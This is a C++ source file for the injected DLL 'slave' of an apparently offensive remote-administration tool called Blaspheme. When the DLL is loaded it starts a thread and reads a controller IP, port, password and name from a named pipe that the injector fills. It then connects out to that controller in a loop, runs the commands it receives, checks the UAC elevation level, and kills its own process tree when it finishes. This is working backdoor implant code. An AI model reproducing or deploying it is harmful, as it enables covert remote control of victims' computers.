#include <windows.h>
HANDLE threadHandle;

#include <blaspheme/protocol/ConnectionInfo.hpp>
#include <blaspheme/Blaspheme.hpp>

#include <common/Log.hpp>

#include <network/Pipe.hpp>
#include <system/Uac.hpp>
#include <system/Process.hpp>

#include "SlaveCore.hpp"
using namespace Inhibition;
using namespace System;

// il faut récupérer  l'ip, le port, le mot de passe et le nom du client que va
// nous envoyer l'injecteur
// pour ce faire, on utilise les "pipe" à la windows (IPC)
Blaspheme::ConnectionInfo getConnectionInfo()
{
	Network::Pipe pipe;
    Blaspheme::ConnectionInfo infos;
    if(pipe.connect(PIPE_NAME))
    {
		char blaspheme [Blaspheme::DEFAULT_STR_SIZE];
        pipe.recv(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
        std::string buffer(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
		size_t end = buffer.find_last_of(MARKER);
		buffer = buffer.substr(MARKER_SIZE, end+1-2*MARKER_SIZE);

        std::string port_buffer;
        std::istringstream iss(buffer);

        std::getline( iss, infos.ip, SEPERATOR );
        std::getline( iss, port_buffer, SEPERATOR );
        std::getline( iss, infos.name, SEPERATOR );
        std::getline( iss, infos.password, SEPERATOR );

        fromString(port_buffer, infos.port);
        pipe.disconnect();
    }
	else
	{
		throw Common::Exception("getConnectionInfo() : unable to connect to pipe");
	}
	return infos;
}

DWORD WINAPI run(void)
{
	try
	{
		LOG.setHeader("SLAVE");
		LOG.addObserver(new Common::LogToConsole);
		LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));
		Blaspheme::ConnectionInfo info = getConnectionInfo();
		/*
		Blaspheme::ConnectionInfo info;
		info.ip = "127.0.0.1";
		info.port = 80;
		info.password = "crunch";
		info.name = "default";
		*/
	    
		
		SlaveCore slave(info);

		LOG << GetElevationType();
		LOG << "Trying connection on " + slave.getConnection().ip + ":" + toString(slave.getConnection().port);
		while(!slave.exiting())
		{
			try
			{
				if(slave.connect())
				{
					LOG << "Session started";
					while(slave.process_command());
					LOG << "Session ended";
					slave.disconnect();
				}
				Sleep(500);
			}
			catch(Network::Deconnection&)
			{
				LOG << "Untimely disconnect";
				slave.disconnect();
			}
		}
	}
	catch(std::exception& e)
	{
		LOG << e.what();
	}
	catch(...)
	{
		LOG << "Unknown exception";
	}
	
    System::Process::This thisProcess;
	thisProcess.killHierarchy();
	return EXIT_SUCCESS;
}

extern "C" BOOL APIENTRY DllMain (HINSTANCE hModule, DWORD dwMsg, LPVOID lpReserved)
{
    UNREFERENCED_PARAMETER( hModule );
    UNREFERENCED_PARAMETER( lpReserved );

    switch( dwMsg )
    {
		case DLL_PROCESS_ATTACH:
			DisableThreadLibraryCalls( hModule );
			threadHandle = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)run, NULL, 0, 0 );
			return (!threadHandle) ? FALSE : TRUE;
		case DLL_PROCESS_DETACH:
			TerminateThread(threadHandle, EXIT_SUCCESS);
			return TRUE;
    }
    return TRUE;
}
